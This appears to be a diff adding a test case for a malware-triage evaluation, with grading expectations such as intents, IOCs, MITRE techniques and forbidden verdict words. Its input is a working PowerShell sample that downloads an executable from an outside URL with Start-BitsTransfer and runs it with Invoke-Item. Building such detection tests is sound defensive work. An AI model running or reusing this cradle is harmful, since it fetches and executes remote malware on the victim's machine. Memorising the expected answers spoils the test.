@@ -1,0 +1,50 @@
+id: T11_bits_download_and_execute
+title: Malicious — BITS Start-BitsTransfer + Invoke-Item download-and-execute cradle
+provenance: real-world sample flagged by SOC review (2026-07-29)
+input: |
+  try{
+      for ($i=1; $i -le 13000; $i++) {
+          $i,"`n"
+      }
+  }catch{}
+
+  function kqmeh ($yphjc,$qhl){
+      Import-Module BitsTransfer
+      Start-BitsTransfer -Source $yphjc -Destination $qhl
+      Invoke-Item $qhl
+  }
+
+  try{
+      $cwwheb = $env:temp + '\scwxc.exe'
+      kqmeh 'http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe' $cwwheb
+  }catch{}
+expected_verdict: malicious
+must_fire_intents:
+  - staging
+  - remote_execution
+must_not_fire:
+  - persistence
+  - credential_access
+forbidden_words_in_verdict:
+  - ransomware
+  - cobalt strike
+  - campaign
+  - APT
+must_admit_unknown: false
+expected_confidence_band: high
+expected_iocs:
+  - {kind: url, value: 'http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe'}
+  - {kind: file, value: 'scwxc.exe'}
+expected_mitre:
+  - T1197
+  - T1204.002
+expected_behaviors:
+  - remote source
+  - staging
+expected_evidence:
+  - start-bitstransfer
+  - invoke-item
+min_recommendations: 2
+notes: >
+  BITS download of a remote executable followed by Invoke-Item is the
+  canonical Living-off-the-Land download-and-execute pattern.
